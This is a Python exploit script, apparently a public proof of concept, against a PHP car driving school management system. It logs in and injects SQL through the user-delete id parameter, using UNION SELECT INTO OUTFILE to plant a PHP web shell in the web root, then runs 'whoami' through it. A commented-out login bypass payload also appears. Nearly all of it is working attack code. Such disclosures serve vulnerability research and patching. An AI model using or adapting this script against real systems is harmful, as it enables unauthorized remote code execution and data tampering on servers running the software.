# Application: https://www.sourcecodester.com/php/15070/car-driving-school-management-system-phpoop-free-source-code.html

# Vulnerable code: (admin -> classes -> Users.php)
# 	public function delete_users(){
# 		SNIPPED
# 		$qry = $this->conn->query("DELETE FROM users where id = $id");
    
# Author: evdaez
# Date: 7/12/2021

import requests
import binascii
from os import system, urandom

def clear_screen():
    system("cls")

def login(ip, proxies, username, password):
    sess = requests.session()
    loginURL = f"http://{ip}/cdsms/classes/Login.php?f=login"

    # data = {
    #     "username": username,
    #     "password": "test') or TRUE -- -"
    # }

    data = {
        "username": username,
        "password": password
    }

    req = sess.post(loginURL, data=data, proxies=proxies, verify=False)

    if "success" in req.text:
        print(f"[+] Login as {username} sucessful!")
        print(f"[+] Cookie: PHPSESSID={sess.cookies['PHPSESSID']}")
        return sess
    else:
        print("[-] Login failed!")
        raise SystemExit

def exploit(ip, proxies, sess):
    deleteURL = f"http://{ip}/cdsms/classes/Users.php?f=delete"
    randomFilename = binascii.hexlify(urandom(16)).decode()
    headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    payload = f'id=9999\' UNION SELECT \"<?php system($_GET[\'cmd\']);?>\" INTO OUTFILE \"C:\\\\xampp\\\\htdocs\\\\cdsms\\\\{randomFilename}.php\" -- -'

    sess.post(deleteURL, headers=headers, data=payload, proxies=proxies, verify=False)
    webShell = f"http://{ip}/cdsms/{randomFilename}.php"
    print(f"[+] Webshell at: {webShell}")

    webShell += "?cmd=whoami"    
    req = sess.get(webShell)
    print("[+] RCE Results:")
    print(req.text)

if __name__ == "__main__":
    proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}
    ip = '127.0.0.1'
    username = 'user'
    password = 'user123'

    clear_screen()
    sess = login(ip, proxies, username, password)
    exploit(ip, proxies, sess)